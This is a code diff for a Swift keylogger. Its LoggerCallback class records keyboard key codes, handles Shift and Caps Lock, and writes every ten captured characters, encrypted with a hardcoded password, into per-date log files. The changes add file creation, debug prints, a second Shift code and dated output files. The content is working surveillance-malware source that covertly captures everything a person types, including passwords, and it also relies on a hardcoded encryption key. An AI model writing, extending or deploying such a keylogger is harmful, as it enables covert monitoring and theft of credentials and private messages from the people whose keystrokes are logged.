@@ -15,7 +15,6 @@ class LoggerCallback
     static var PASSWORD = "this-is-the-PASSWORD-for-KeySaver1"
     static var CAPSLOCK = false
     static var SHIFT = false
-    static var calander = Calendar.current
     //    static var prev = ""
     static var command = false
     
@@ -23,6 +22,7 @@ class LoggerCallback
     
     static func encrypt(text: String, toFile file: URL) {
         if var fileContents = NSData.init(contentsOf: file) as Data? {
+            print("file exists")
             if (!fileContents.isEmpty) {
                 fileContents = try! RNCryptor.decrypt(data: fileContents as Data, withPassword: LoggerCallback.PASSWORD)
             }
@@ -37,10 +37,13 @@ class LoggerCallback
             fhs?.seekToEndOfFile()
             fhs?.write(ciphertext)
         } else {
+            print("file doesn't exist")
             let newText = text.data(using: .utf8)!
             let ciphertext = RNCryptor.encrypt(data: newText as Data, withPassword: LoggerCallback.PASSWORD)
+            if !FileManager.default.createFile(atPath: file.path, contents: nil, attributes: nil) {
+                print("Can't Create File")
+            }
             let fhs = FileHandle.init(forWritingAtPath: file.path)
-            fhs?.seekToEndOfFile()
             fhs?.write(ciphertext)
         }
     }
@@ -93,7 +96,7 @@ class LoggerCallback
             if code >= 58 && code <= 83 || code == 41 || code == 42 {
                 break Outside
             }
-            if code == 225 { // Shift
+            if code == 225 || code == 229 { // Shift
                 LoggerCallback.SHIFT = true
                 break Outside
             }
@@ -109,11 +112,11 @@ class LoggerCallback
                 text += this.keyMap[code]![0]
             }
             if (text.count == 10) {
-                LoggerCallback.encrypt(text: text, toFile: Keylogger.filenameUrl)
+                LoggerCallback.encrypt(text: text, toFile: Keylogger.getDateFile())
                 text = ""
             }
         } else { // keyup
-            if code == 225 { // no more shift
+            if code == 225 || code == 229 { // no more shift
                 LoggerCallback.SHIFT = false
                 break Outside
             }
